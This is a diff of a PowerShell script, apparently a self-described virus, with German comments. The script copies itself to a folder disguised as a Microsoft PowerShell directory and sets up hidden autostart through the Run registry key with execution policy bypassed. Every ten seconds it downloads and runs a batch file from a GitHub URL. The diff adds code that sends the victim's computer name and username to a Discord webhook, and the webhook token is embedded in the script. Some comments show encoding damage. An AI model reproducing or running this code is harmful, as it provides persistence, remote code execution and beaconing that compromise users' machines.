@@ -1,32 +1,29 @@
 # Zielpfad, in den das Repository kopiert wird
 $TargetPath = "$env:USERPROFILE\AppData\Local\Programs\Microsoft-Powershell"
-# Pfad zum Registrierungsschlüssel
+# Pfad zum RegistrierungsschlÃ¼ssel
 $RegKeyPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 # Name des Registrierungswerts
 $ValueName = "MyStartupScript"
-# Daten für den Registrierungswert
+# Daten fÃ¼r den Registrierungswert
 $ValueData = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$TargetPath\virus.ps1`""
+#Webhook Url
+$webhookUrl = "https://discordapp.com/api/webhooks/1236328074887299145/nssyhlyQnpJCQ6az6hYDd3VtkfqHMMb3451H2XWgub9GQ-q668mUlMZ1dsngmSHjRvs9"
+#Computer und Username des jeweiligen Computers
+$computerName = (Get-WmiObject -Class Win32_ComputerSystem).Name
+$username = (Get-WmiObject -Class Win32_ComputerSystem).UserName
+#Nachricht
+$message = "Script wurde auf $computerName mit dem User $username gestartet"
 
-# Intervall für die Überprüfung in Sekunden (z.B. alle 5 Minuten)
+# Intervall fÃ¼r die ÃœberprÃ¼fung in Sekunden (z.B. alle 5 Minuten)
 $checkInterval = 10
 #Url zu den Github Dateien
 $url = "https://raw.githubusercontent.com/Samuitl/New-Test/main/start.bat"
-# Überprüfen und Erstellen des Zielpfads
+# ÃœberprÃ¼fen und Erstellen des Zielpfads
 if (-not (Test-Path -Path $TargetPath)) {
     New-Item -Path $TargetPath -ItemType Directory -Force
-}
-# Kopieren des eigenen Skriptes in das Zielverzeichnis
-$ScriptContents = $MyInvocation.MyCommand.ScriptContents
-$ScriptContents | Out-File -FilePath "$TargetPath\MyCopy.ps1" -Encoding utf8
-# Funktion zum Herunterladen und Ausführen des Files
-function DownloadAndExecuteFile {
-    # Herunterladen des Files
-    Invoke-WebRequest -Uri $url -OutFile "$TargetPath\start.bat" -ErrorAction SilentlyContinue
-    # Überprüfen, ob das File erfolgreich heruntergeladen wurde
-    if (Test-Path "$TargetPath\start.bat") {
-        # Ausführen des heruntergeladenen Files
-        & "$TargetPath\start.bat"
-    }
+    # Kopieren des eigenen Skriptes in das Zielverzeichnis
+    $ScriptContents = $MyInvocation.MyCommand.ScriptContents
+    $ScriptContents | Out-File -FilePath "$TargetPath\MyCopy.ps1" -Encoding utf8
 }
 # Einrichten des Autostart-Eintrags
 try {
@@ -37,8 +34,22 @@ try {
 } catch {
     New-ItemProperty -Path $RegKeyPath -Name $ValueName -Value $ValueData -Type String -Force
 }
-# Schleife für die regelmäßige Ausführung
+#Nachricht wird an Discord Webhook gesendet
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($message | ConvertTo-Json) -ContentType "application/json"
+# Funktion zum Herunterladen und AusfÃ¼hren des Files
+function DownloadAndExecuteFile {
+    # Herunterladen des Files
+    Invoke-WebRequest -Uri $url -OutFile "$TargetPath\start.bat" -ErrorAction SilentlyContinue
+    # ÃœberprÃ¼fen, ob das File erfolgreich heruntergeladen wurde
+    if (Test-Path "$TargetPath\start.bat") {
+        # AusfÃ¼hren des heruntergeladenen Files
+        & "$TargetPath\start.bat"
+    }
+}
+
+# Schleife fÃ¼r die regelmÃ¤ÃŸige AusfÃ¼hrung
 while ($true) {
     DownloadAndExecuteFile
     Start-Sleep -Seconds $checkInterval
 }
+
